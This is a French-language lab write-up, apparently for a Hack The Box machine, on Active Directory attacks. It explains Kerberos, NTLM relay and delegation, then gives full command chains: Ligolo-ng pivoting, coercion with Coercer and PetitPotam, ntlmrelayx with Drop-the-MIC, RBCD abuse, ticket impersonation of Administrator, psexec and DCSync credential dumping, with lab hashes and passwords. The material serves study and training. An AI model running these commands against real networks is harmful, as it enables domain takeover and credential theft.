# NTLM Relay, Coerce, Ligolo-ng & RBCD

***

### <mark style="color:blue;">1. Vue d'ensemble de la Chaîne d'Attaque</mark>

#### Schéma global pirate.htb

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CHAÎNE D'ATTAQUE — pirate.htb                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ÉTAPE 1 — Foothold                                                         │
│  ─────────────────                                                          │
│  Pre2K : MS01$ / ms01  →  auth Kerberos comme machine                      │
│                                                                             │
│  ÉTAPE 2 — Escalade locale                                                  │
│  ─────────────────────────                                                  │
│  MS01$ ∈ Domain Secure Servers  →  gMSADumper  →  NTLM gMSA comptes       │
│  gMSA_ADCS_prod$ / gMSA_ADFS_prod$  →  evil-winrm DC01 (Pwn3d!)           │
│                                                                             │
│  ÉTAPE 3 — Pivot réseau isolé                                               │
│  ─────────────────────────────                                              │
│  Ligolo-ng via DC01  →  route 192.168.100.0/24  →  WEB01 accessible        │
│                                                                             │
│  ÉTAPE 4 — Lateral Move sur WEB01                                           │
│  ──────────────────────────────                                             │
│  Coerce WEB01 (gMSA_ADFS_prod$)  →  NTLMrelayx + RBCD + RemoveMIC         │
│  getST RBCD  →  impacket-psexec WEB01 (Administrator) ✅                   │
│                                                                             │
│  ÉTAPE 5 — Dump credentials                                                 │
│  ───────────────────────────                                                │
│  secretsdump WEB01  →  a.white:E2nvAOKSz5Xz2MJu (en clair dans LSA)        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### Environnement

| Machine | IP (HTB)                | IP (interne)  | Rôle                |
| ------- | ----------------------- | ------------- | ------------------- |
| DC01    | 10.129.244.95           | 192.168.100.1 | Domain Controller   |
| WEB01   | _(inaccessible direct)_ | 192.168.100.2 | Serveur web interne |
| Kali    | 10.10.14.26             | —             | Attaquant           |

***

### <mark style="color:blue;">2. Théorie Kerberos — Rappel Essentiel</mark>

#### <mark style="color:green;">Les acteurs</mark>

```
Client  → l'utilisateur qui veut accéder à un service
KDC     → Key Distribution Center = le DC
  ├── AS  → Authentication Service  (délivre les TGT)
  └── TGS → Ticket Granting Service (délivre les tickets de service)
Service → la ressource cible (ex: CIFS/WEB01)
```

#### <mark style="color:green;">Les secrets dans l'AD</mark>

```
Utilisateur (a.white)  → hash dérivé de son mot de passe
Machine (WEB01$)       → clé machine auto-générée, rotation ~30 jours
krbtgt                 → clé maître du KDC, signe TOUS les TGT
```

#### <mark style="color:green;">Étape 1 — AS-REQ / AS-REP (obtenir le TGT)</mark>

```
Client                              KDC (AS)
  │                                   │
  │──── AS-REQ ──────────────────────→│
  │     "je suis a.white"             │
  │     pré-auth chiffrée             │
  │     avec hash a.white             │
  │                                   │
  │  ←──────────────────── AS-REP ────│
  │                                   │
  │     TGT {                         │
  │       qui    : a.white            │
  │       expire : +10h               │
  │       clé session                 │
  │     } chiffré avec secret krbtgt  │
  │                                   │
  │     + clé session chiffrée        │
  │       avec hash a.white           │
```

> Le TGT est une **preuve d'identité** valable 10h.\
> Seul le KDC peut le lire (chiffré avec `krbtgt`).

#### <mark style="color:$tint;">Étape 2 — TGS-REQ / TGS-REP (obtenir un ticket de service)</mark>

```
Client                              KDC (TGS)
  │                                   │
  │──── TGS-REQ ─────────────────────→│
  │     "je veux CIFS/WEB01"          │
  │     + mon TGT                     │
  │                                   │
  │     KDC vérifie le TGT            │
  │     (déchiffre avec krbtgt)       │
  │                                   │
  │  ←──────────────────── TGS-REP ───│
  │                                   │
  │     Ticket de service {           │
  │       qui     : a.white           │
  │       service : CIFS/WEB01        │
  │       expire  : +10h              │
  │     } chiffré avec secret WEB01$  │
```

> Le ticket est chiffré avec le secret du compte qui **possède le SPN** CIFS/WEB01.

#### <mark style="color:green;">Étape 3 — AP-REQ (utiliser le ticket)</mark>

```
Client                              WEB01
  │                                   │
  │──── AP-REQ ──────────────────────→│
  │     + ticket de service           │
  │                                   │
  │     WEB01 déchiffre avec          │
  │     SON propre secret (WEB01$)    │
  │                                   │
  │     "a.white accède à             │
  │      CIFS/WEB01" → OK ✅          │
  │  ←──────────────────── AP-REP ────│
```

#### <mark style="color:green;">Schéma complet Kerberos</mark>

```
a.white              KDC (DC01)             WEB01
   │                     │                    │
   │──── AS-REQ ─────────►                    │
   │◄─── AS-REP (TGT) ───│                    │
   │     [chiffré krbtgt] │                    │
   │                      │                    │
   │──── TGS-REQ ─────────►                    │
   │     + TGT             │                    │
   │     "CIFS/WEB01"      │                    │
   │◄─── TGS-REP ──────────│                    │
   │     ticket [chiffré WEB01$]                │
   │                       │                    │
   │──────────────────────────── AP-REQ ────────►
   │                       │  WEB01 déchiffre ✅ │
   │◄────────────────────────────── AP-REP ───────│
   │                       │  accès accordé ✅   │
```

***

### <mark style="color:blue;">3. Théorie NTLM — Challenge/Response & Relay</mark>

#### Flux NTLM (3 messages)

```
Client                              Serveur
  │                                   │
  │──── NEGOTIATE (msg1) ────────────→│
  │     "je supporte NTLM"            │
  │                                   │
  │  ←──────── CHALLENGE (msg2) ──────│
  │            nonce aléatoire        │
  │            (8 octets)             │
  │                                   │
  │──── AUTHENTICATE (msg3) ─────────→│
  │     NTLMv2 = HMAC-MD5(            │
  │       Hash(password),             │
  │       challenge + timestamp)      │
```

#### Différence NTLM hash vs NetNTLMv2

| Type          | Format                      | Pass-the-Hash ? | Relay ? | Crackable ?             |
| ------------- | --------------------------- | --------------- | ------- | ----------------------- |
| **NTLM hash** | `MD4(password)`             | ✅ Oui           | ✅ Oui   | ✅ Oui                   |
| **NetNTLMv2** | `HMAC-MD5(hash, challenge)` | ❌ Non           | ✅ Oui   | ✅ Oui (hashcat -m 5600) |

#### <mark style="color:green;">NTLM Relay — Comment ça fonctionne</mark>

```
SANS relay (auth normale) :
  Client ─── auth NTLM ───► Serveur A
  Serveur A vérifie avec le DC

AVEC relay (attaque) :
  Client ─── auth NTLM ──► ATTAQUANT ─── relay ──► Serveur B
                              │
                              └── Le client croit parler à A
                                  L'attaquant parle à B en son nom
                                  avec les droits du client ✅
```

#### Condition sine qua non : SMB Signing

```
SMB Signing = True   → relay IMPOSSIBLE (signature cryptographique)
SMB Signing = False  → relay POSSIBLE ✅

Identifier les cibles sans signing :
  nxc smb <IP_range> --gen-relay-list relay_targets.txt
```

#### <mark style="color:green;">CVE-2019-1040 — Drop the MIC (Remove-MIC)</mark>

```
Normalement :
  Le message NTLM AUTHENTICATE contient un MIC
  (Message Integrity Check) — signature du message entier.
  → empêche un attaquant de modifier les flags NTLM pendant le relay

Drop the MIC :
  On retire le MIC du message AUTHENTICATE.
  Certains serveurs (DCs vulnérables) acceptent QUAND MÊME.

Résultat :
  → Relay de SMB vers LDAP/LDAPS possible
    même si SMB Signing est activé sur le DC cible
  → Permet de modifier les flags NTLM (ex: enlever le signing requis)

Détecter la vulnérabilité :
  nxc smb <DC_IP> -u user -p pass -M remove-mic
```

#### <mark style="color:green;">Protocoles relayables</mark>

```
SOURCE (coercé)    DESTINATION (relay)   RÉSULTAT POSSIBLE
─────────────────  ────────────────────  ──────────────────
SMB                LDAP/LDAPS            Écriture AD (RBCD, comptes)
SMB                SMB (signing=False)   Exec distant (psexec)
HTTP/WebDAV        LDAP/LDAPS            Écriture AD
SMB + RemoveMIC    LDAPS                 Écriture AD même si signing=True
```

***

### <mark style="color:blue;">4. Les 3 Types de Délégation Kerberos</mark>

#### <mark style="color:green;">Contexte : le problème du double-hop</mark>

```
User → (s'authentifie) → ServerA (IIS)
        ServerA a besoin d'accéder à ServerB (SQL)
        EN SE FAISANT PASSER pour l'user

Comment ServerA accède à ServerB avec l'identité de l'user ?
→ C'est le rôle de la délégation Kerberos
```

***

#### <mark style="color:$success;">4.1 Unconstrained Delegation — "Confiance totale"</mark>

```
Configuration sur ServerA :
  TrustedForDelegation = True

Ce qui se passe lors de l'auth :
  User → ServerA : envoie son TGT complet
  ServerA stocke le TGT
  ServerA peut se faire passer pour l'user VERS N'IMPORTE QUEL SERVICE
```

**Schéma :**

```
User                   ServerA                    N'importe quoi
  │                       │                            │
  ├── auth + TGT ─────────►                            │
  │                       │ stocke le TGT              │
  │                       ├─── accès SQL Server ───────►
  │                       ├─── accès DC ───────────────►
  │                       ├─── accès Exchange ─────────►
```

**Exploitation :**

```
⚠️ Si ServerA est compromis :
  → l'attaquant a les TGT de tous les users connectés
  → Combo avec Coerce : forcer le DC à se connecter à ServerA
    → récupérer le TGT du DC → Silver/Golden Ticket
```

***

#### <mark style="color:$success;">4.2 Constrained Delegation — "Confiance limitée"</mark>

```
Configuration sur ServerA :
  msDS-AllowedToDelegateTo = ["cifs/ServerB.domain.local"]
  TrustedToAuthForDelegation = True  (protocol transition)

ServerA peut usurper des users
MAIS seulement vers les SPNs listés dans msDS-AllowedToDelegateTo
```

**Schéma :**

```
User                   ServerA                 ServerB        ServerC
  │                       │                      │               │
  ├── auth ───────────────►                       │               │
  │                       ├── S4U ──────────────►  ✅             │
  │                       │   Admin sur cifs/B    │               │
  │                       ├── S4U ────────────────────────────── ► ❌
  │                       │   Admin sur cifs/C  REFUSÉ (pas dans la liste)
```

> Modifier `msDS-AllowedToDelegateTo` requiert **SeEnableDelegation** → droit DA uniquement.

***

#### <mark style="color:$success;">4.3 RBCD — Resource-Based Constrained Delegation</mark>

```
La règle est écrite sur la RESSOURCE (ServerB), pas sur le délégant (ServerA)

Attribut sur ServerB :
  msDS-AllowedToActOnBehalfOfOtherIdentity = [ServerA$]

ServerB dit : "j'accepte que ServerA vienne usurper des users chez moi"
```

**Schéma :**

```
User                   ServerA                  ServerB
  │                       │                       │
  │                       │   RBCD sur ServerB ───│
  │                       │   "ServerA autorisé"  │
  │                       │                       │
  ├── auth ───────────────►                       │
  │                       ├── S4U2Self ───────────►
  │                       ├── S4U2Proxy ──────────►
  │                       │   DC vérifie RBCD ✅  │
  │                       │   ticket Admin ────────►
```

**Pourquoi c'est exploitable :**

```
Si tu as WRITE sur ServerB (GenericWrite, GenericAll, WriteDACL...)
→ tu peux écrire toi-même la règle RBCD
→ "ServerB accepte MON_COMPTE$"
→ MON_COMPTE$ peut usurper Administrator sur ServerB ✅
→ sans compromettre ServerB directement
```

**Tableau comparatif des 3 délégations :**

| Critère                 | Unconstrained        | Constrained          | RBCD                   |
| ----------------------- | -------------------- | -------------------- | ---------------------- |
| **Règle écrite sur**    | ServerA              | ServerA              | ServerB (la cible)     |
| **Portée**              | Partout              | SPNs fixes           | SPNs fixes (sur cible) |
| **Protocol Transition** | Non requis           | Optionnel            | Optionnel              |
| **Modifier sans DA**    | ❌                    | ❌ SeEnableDelegation | ✅ si Write sur ServerB |
| **Attaquant besoin de** | Compromettre ServerA | Compromettre ServerA | Write sur ServerB      |
| **Arête BloodHound**    | AllowedToDelegate    | AllowedToDelegate    | AllowedToAct           |

***

### <mark style="color:blue;">5. S4U2Self & S4U2Proxy — Mécanisme Détaillé</mark>

#### <mark style="color:$success;">Le problème résolu</mark>

```
ServerA (KCD configuré) veut accéder à ServerB en tant qu'Administrator
MAIS Administrator ne s'est jamais connecté à ServerA
→ ServerA n'a pas de TGS pour Administrator

Solution : S4U Extensions
→ ServerA fabrique lui-même la preuve d'authentification
```

#### <mark style="color:$success;">S4U2Self — "Fabriquer une preuve d'auth"</mark>

```
ServerA                           DC (KDC)
  │                                  │
  │──── S4U2Self REQ ───────────────→│
  │     "donne moi un ticket         │
  │      Administrator → ServerA"   │
  │     (sans qu'Admin ait rien fait)│
  │                                  │
  │     DC vérifie :                 │
  │     ServerA TrustedToAuth ? ✅   │
  │                                  │
  │  ←──── S4U2Self REP ─────────────│
  │        TGS(Administrator→ServerA)│
  │        [forwardable = True]      │
```

> ⚠️ Si le ticket n'est pas `forwardable`, S4U2Proxy ne fonctionnera pas.\
> Condition : `TrustedToAuthForDelegation = True` sur ServerA (protocol transition).

#### <mark style="color:$success;">S4U2Proxy — "Utiliser la preuve pour aller ailleurs"</mark>

```
ServerA                           DC (KDC)
  │                                  │
  │──── S4U2Proxy REQ ──────────────→│
  │     "je veux un ticket Admin     │
  │      pour cifs/ServerB"          │
  │     + TGS S4U2Self (preuve)      │
  │                                  │
  │     DC vérifie :                 │
  │     ServerA autorisé sur B ?     │
  │     → msDS-AllowedToDelegateTo   │
  │     → ou RBCD sur ServerB        │
  │                                  │
  │  ←──── S4U2Proxy REP ────────────│
  │        TGS(Administrator→cifs/B) │
  │        [chiffré avec secret B$]  │
```

#### <mark style="color:$success;">Schéma complet S4U</mark>

```
ServerA               DC (KDC)                ServerB
  │                     │                       │
  ├── S4U2Self ─────────►                       │
  │   "ticket Admin → moi"                      │
  │◄─ TGS(Admin→ServerA) │                      │
  │                      │                      │
  ├── S4U2Proxy ──────────►                     │
  │   "ticket Admin → B" │                      │
  │   + TGS S4U2Self     │                      │
  │   DC vérifie RBCD ✅ │                      │
  │◄─ TGS(Admin→cifs/B) ─│                      │
  │                       │                     │
  ├────────────────────────────── AP-REQ ────────►
  │                       │  accès Admin ✅      │
```

***

### <mark style="color:blue;">7. Pivoting avec Ligolo-ng</mark>

#### <mark style="color:$success;">Pourquoi Ligolo-ng</mark>

```
WEB01 est sur 192.168.100.2 — réseau ISOLÉ, inaccessible depuis Kali
DC01 est sur DEUX réseaux :
  10.129.244.95  (réseau HTB, accessible depuis Kali)
  192.168.100.1  (réseau interne, accessible depuis WEB01)

Ligolo-ng crée une vraie interface TUN dans le kernel Linux.
→ tout trafic vers 192.168.100.x est routé via l'agent sur DC01
→ PAS BESOIN de proxychains
→ nmap, impacket, evil-winrm, coercer... fonctionnent nativement
```

#### <mark style="color:$success;">Architecture du tunnel</mark>

```
Kali (10.10.14.26)
   │
   │ ← interface ligolo (TUN)
   │   ip route add 192.168.100.0/24 dev ligolo
   │
   ▼ [tunnel chiffré TLS sur port 443]
DC01 (10.129.244.95 = 192.168.100.1)
   │ agent ligolo en cours d'exécution
   │
   ▼ [réseau interne]
WEB01 (192.168.100.2) ← maintenant accessible depuis Kali ✅
```

#### <mark style="color:$success;">Routing du reverse shell depuis WEB01</mark>

```
WEB01 veut envoyer un reverse shell à Kali (10.10.14.26)
  │
  │ 10.10.14.26 n'est pas dans son subnet (192.168.100.x)
  │ → WEB01 envoie vers sa default gateway = DC01 (192.168.100.1)
  │
DC01 reçoit le paquet
  │ DC01 est aussi sur 10.129.x.x → route le trafic vers HTB
  │
Kali reçoit la connexion ✅ (DC01 joue le rôle de routeur)
```

#### Setup complet

```bash
# ══════════════════════════════════════
# KALI — Préparer l'interface TUN
# ══════════════════════════════════════
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo

# Lancer le proxy Ligolo (écoute les agents)
sudo ./proxy -selfcert -laddr 0.0.0.0:443

# ══════════════════════════════════════
# DC01 — Via shell evil-winrm
# ══════════════════════════════════════
upload /home/kali/tools/ligolo/agent.exe
.\agent.exe -connect 10.10.14.26:443 -ignore-cert

# ══════════════════════════════════════
# CONSOLE LIGOLO (interactive)
# ══════════════════════════════════════
session           # choisir la session DC01
ifconfig          # voir les réseaux visibles (192.168.100.0/24 visible !)
start             # démarrer le tunnel

# ══════════════════════════════════════
# KALI — Vérification
# ══════════════════════════════════════
ping 192.168.100.2    # WEB01 répond ✅
nmap -sT -Pn -p 445,5985,80 192.168.100.2
```

#### Recevoir un reverse shell depuis le réseau interne

```bash
# Dans la console Ligolo : listener_add
# Écoute sur DC01:4444 et redirige vers Kali:4444
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Sur Kali : préparer le listener
nc -nvlp 4444

# Depuis WEB01 : se connecter vers DC01:4444
# → DC01 redirige vers Kali:4444 ✅
```

***

### <mark style="color:blue;">8. NTLM Relay + Coerce + RBCD — Attaque sur WEB01</mark>

#### <mark style="color:$success;">Prérequis identifiés dans pirate.htb</mark>

```
✓ gMSA_ADFS_prod$ a le SPN host/adfs.pirate.htb
  → peut s'authentifier sur les machines du domaine
✓ SMB Signing = False sur WEB01
  → relay NTLM possible
✓ WEB01 accessible via Ligolo (192.168.100.2)
✓ WEB01 peut joindre Kali via DC01 (routeur)
✓ Windows Server 2019 → besoin de --remove-mic
```

#### <mark style="color:$success;">Vue d'ensemble de l'attaque</mark>

```
┌──────────────────────────────────────────────────────────────────────┐
│                    FLUX COMPLET DE L'ATTAQUE                         │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  TERMINAL 1 — ntlmrelayx en attente                                  │
│  ─────────────────────────────────                                   │
│  écoute sur 0.0.0.0                                                  │
│  configuré pour relay → LDAPS du DC                                  │
│  options : --delegate-access --remove-mic                            │
│                                                                      │
│  TERMINAL 2 — Coercer force WEB01 à s'auth vers Kali                 │
│  ───────────────────────────────────────────────────                 │
│  auth sur WEB01 avec gMSA_ADFS_prod$                                 │
│  envoie requête RPC (MS-EFSR, MS-RPRN, etc.)                        │
│  "WEB01, connecte-toi à 10.10.14.26"                                 │
│                                                                      │
│  WEB01 obéit → envoie auth NTLM (WEB01$) → Kali                     │
│                                                                      │
│  ntlmrelayx reçoit l'auth de WEB01$                                  │
│  → remove MIC → relay vers LDAPS du DC                              │
│  → authentifié comme WEB01$ sur le DC                               │
│  → crée GDRFEDVU$ (Machine Account Quota)                           │
│  → écrit RBCD : WEB01$.msDS-AllowedToActOnBehalf = GDRFEDVU$        │
│                                                                      │
│  Résultat : GDRFEDVU$ peut usurper n'importe quel user sur WEB01 ✅  │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

#### <mark style="color:$success;">Schéma réseau détaillé</mark>

```
COERCER                    WEB01                    DC (LDAPS)
(gMSA_ADFS_prod$)       (192.168.100.2)         (10.129.244.95)
   │                         │                         │
   ├─── RPC coerce ──────────►                         │
   │    "connecte-toi à       │                         │
   │     10.10.14.26"         │                         │
   │                          │                         │
   │             WEB01$ ──────► NTLMRELAYX              │
   │             auth NTLM    │  (Kali:10.10.14.26)     │
   │                          │       │                 │
   │                          │       ├─── relay ────────►
   │                          │       │    auth WEB01$   │
   │                          │       │                 │
   │                          │       │  WEB01$ auth ✅  │
   │                          │       ├─── addcomputer ──►
   │                          │       │    GDRFEDVU$    │
   │                          │       ├─── write RBCD ───►
   │                          │       │    WEB01$.msDS   │
   │                          │       │    = GDRFEDVU$ ✅│
```

#### <mark style="color:$success;">Pourquoi --remove-mic contourne Server 2019</mark>

```
Windows Server 2019 avec SMB Signing activé :
  Normalement → relay SMB vers LDAPS impossible
  car le MIC (Message Integrity Check) protège le message AUTHENTICATE

--remove-mic retire ce MIC du message AUTHENTICATE.
Le DC Server 2019 (non patché) accepte quand même la connexion.
→ Relay SMB → LDAPS opérationnel même avec Server 2019 ✅

Patch : KB4493441 (April 2019) corrige ce comportement.
```

#### <mark style="color:$success;">Exploitation complète</mark>

```bash
# ══════════════════════════════════════
# TERMINAL 1 — ntlmrelayx (Kali)
# ══════════════════════════════════════
sudo impacket-ntlmrelayx \
  -smb2support \
  -t ldaps://10.129.244.95 \
  --delegate-access \
  --remove-mic

# Ce que fait ntlmrelayx quand il reçoit l'auth de WEB01$ :
#   1. Retire le MIC (--remove-mic)
#   2. Relay vers LDAPS DC en tant que WEB01$
#   3. Crée GDRFEDVU$ via MAQ
#   4. msDS-AllowedToActOnBehalf de WEB01$ = GDRFEDVU$
#   → "GDRFEDVU$ can now impersonate users on WEB01$ via S4U2Proxy"

# ══════════════════════════════════════
# TERMINAL 2 — Coercer (Kali)
# ══════════════════════════════════════
coercer coerce \
  -l 10.10.14.26 \
  -t 192.168.100.2 \
  -d pirate.htb \
  -u 'gMSA_ADFS_prod$' \
  --hashes :fd9ea7ac7820dba5155bd6ed2d850c09 \
  --always-continue

# Coercer essaie tous les protocols de coercition disponibles :
# MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP, MS-DFSNM...
# → l'un d'eux force WEB01 à s'authentifier vers 10.10.14.26

# ══════════════════════════════════════
# OBTENIR UN SHELL SUR WEB01
# ══════════════════════════════════════

# Clock skew = +7h dans pirate.htb
faketime -f '+7h' impacket-getST \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/GDRFEDVU$:+5HnoAr3Io+yzwj' \
  -dc-ip 10.129.244.95

export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

faketime -f '+7h' impacket-psexec \
  -k -no-pass Administrator@WEB01.pirate.htb

# → type C:\Users\a.white\Desktop\user.txt  ✅
```

***

### <mark style="color:blue;">9. RBCD — 3 Méthodes (BHIS)</mark>

#### <mark style="color:$success;">Vue d'ensemble des 3 méthodes</mark>

```
┌──────────────────────────────────────────────────────────────────────┐
│  MÉTHODE 1 — Drop the MIC (CVE-2019-1040)                            │
│  Condition : 2 DC, au moins 1 vulnérable à Remove-MIC               │
│  Coerce DC2 → relay vers DC1 (Remove-MIC) → RBCD sur DC2            │
├──────────────────────────────────────────────────────────────────────┤
│  MÉTHODE 2 — GenericWrite + Machine Account Quota                    │
│  Condition : GenericWrite sur un objet AD + MAQ > 0                  │
│  Créer compte machine → écrire RBCD sur la cible                    │
├──────────────────────────────────────────────────────────────────────┤
│  MÉTHODE 3 — GenericWrite + SPN sur user compromis                   │
│  Condition : GenericWrite sur un objet AD                            │
│  Ajouter SPN au user compromis → écrire RBCD sur la cible           │
└──────────────────────────────────────────────────────────────────────┘
```

***

#### <mark style="color:$success;">Méthode 1 — Drop the MIC + Coerce DC</mark>

```
Contexte :
  user.one / Password1!  (compte standard)
  DC01 (10.0.1.202) : vulnérable CVE-2019-1040
  DC02 (10.0.1.203) : non vulnérable, cible du relay
  Attaquant : 10.0.1.13
```

**Schéma :**

```
Attaquant (10.0.1.13)            DC02 (10.0.1.203)          DC01 (10.0.1.202)
   │                                  │                           │
   │── PetitPotam ───────────────────►│                           │
   │   "connecte-toi à 10.0.1.13"    │                           │
   │                                  │                           │
   │          DC02$ auth NTLM ────────►                           │
   │          (ntlmrelayx reçoit)     │                           │
   │                         NTLMRELAYX                           │
   │                              │── relay DC02$ ───────────────►│
   │                              │   --remove-mic               │
   │                              │── addcomputer XEWRIYIH$ ─────►│
   │                              │── write RBCD DC02$.msDS ──────►│
   │                              │   = XEWRIYIH$ ✅              │
```

**Commandes :**

```bash
# Étape 1 : détecter CVE-2019-1040
nxc smb 10.0.1.202 -u 'user.one' -p 'Password1!' -M remove-mic

# Étape 2 : lancer ntlmrelayx
sudo impacket-ntlmrelayx \
  -smb2support \
  -t ldaps://10.0.1.202 \
  --delegate-access \
  --remove-mic

# Étape 3 : coercer DC02 vers notre IP
python3 PetitPotam.py \
  -u 'user.one' -p 'Password1!' -d 'insecure.local' \
  10.0.1.13 10.0.1.203

# Étape 4 : getST en tant que XEWRIYIH$
impacket-getST \
  -dc-ip 10.0.1.203 \
  -impersonate 'administrator' \
  -spn 'host/DC02.insecure.local' \
  'insecure.local/XEWRIYIH$:.*;jl{6qA_:.S_/'

export KRB5CCNAME=administrator@host_DC02.insecure.local@INSECURE.LOCAL.ccache

# Étape 5 : DCSync
impacket-secretsdump -k DC02.insecure.local
```

***

#### <mark style="color:$success;">Méthode 2 — GenericWrite + Machine Account Quota</mark>

```
Contexte :
  dacluser / Password3#  →  GenericWrite sur DC01$
  MAQ par défaut = 10 (tout user peut créer jusqu'à 10 comptes machines)
```

**Schéma :**

```
dacluser (GenericWrite sur DC01$)
   │
   ├── addcomputer → crée machine$ (via MAQ)
   │
   ├── rbcd → DC01$.msDS-AllowedToActOnBehalf = machine$
   │
   └── getST : machine$ usurpe Administrator → host/DC01
               S4U2Self + S4U2Proxy ✅
               → secretsdump DC01
```

**Commandes :**

```bash
# Étape 1 : identifier GenericWrite (BloodHound)
nxc ldap 10.0.1.200 -d 'secure.local' \
  -u 'dacluser' -p 'Password3#' \
  --bloodhound --collection All
# BloodHound : dacluser → GenericWrite → DC01$

# Étape 2 : créer un compte machine
impacket-addcomputer \
  -computer-name 'machine$' \
  -computer-pass 'machinepass!' \
  -dc-host 10.0.1.200 \
  'secure.local/dacluser:Password3#'

# Étape 3 : écrire RBCD sur DC01$
impacket-rbcd \
  -delegate-from 'machine$' \
  -delegate-to 'DC01$' \
  -dc-ip 10.0.1.200 \
  -action 'write' \
  'secure.local/dacluser:Password3#'

# Étape 4 : getST (S4U2Self + S4U2Proxy)
impacket-getST \
  -spn 'host/DC01.secure.local' \
  -impersonate 'administrator' \
  -dc-ip 10.0.1.200 \
  'secure.local/machine$:machinepass!'

export KRB5CCNAME=administrator@host_DC01.secure.local@SECURE.LOCAL.ccache

# Étape 5 : DCSync
impacket-secretsdump -k DC01.secure.local
```

***

#### <mark style="color:$success;">Méthode 3 — GenericWrite + SPN sur user compromis</mark>

```
Contexte :
  dacluser / Password3#  →  GenericWrite sur DC01$
  On utilise dacluser directement comme délégant (pas de MAQ)
  Condition : dacluser DOIT avoir un SPN (requis pour S4U2Proxy)
```

> **Pourquoi un SPN est-il requis ?**\
> S4U2Proxy requiert que le compte délégant soit reconnu comme un "service"\
> par le KDC. Un compte sans SPN ne peut pas faire S4U2Proxy.

**Commandes :**

```bash
# Étape 1 : configurer RBCD sur DC01$ pour dacluser
impacket-rbcd \
  -delegate-from 'dacluser' \
  -delegate-to 'DC01$' \
  -dc-ip 10.0.1.200 \
  -action 'write' \
  'secure.local/dacluser:Password3#'

# Étape 2 : ajouter un SPN à dacluser
python3 addspn.py \
  -u secure.local\dacluser \
  -p 'Password3#' \
  -s host/DACL.secure.local \
  --target-type samname \
  10.0.1.200

# Vérifier : dacluser.servicePrincipalName = host/DACL.secure.local

# Étape 3 : getST
impacket-getST \
  -spn 'host/DC01.secure.local' \
  -impersonate administrator \
  'secure.local/dacluser:Password3#' \
  -dc-ip 10.0.1.200

export KRB5CCNAME=administrator@host_DC01.secure.local@SECURE.LOCAL.ccache

# Étape 4 : DCSync
impacket-secretsdump -k DC01.secure.local
```

***
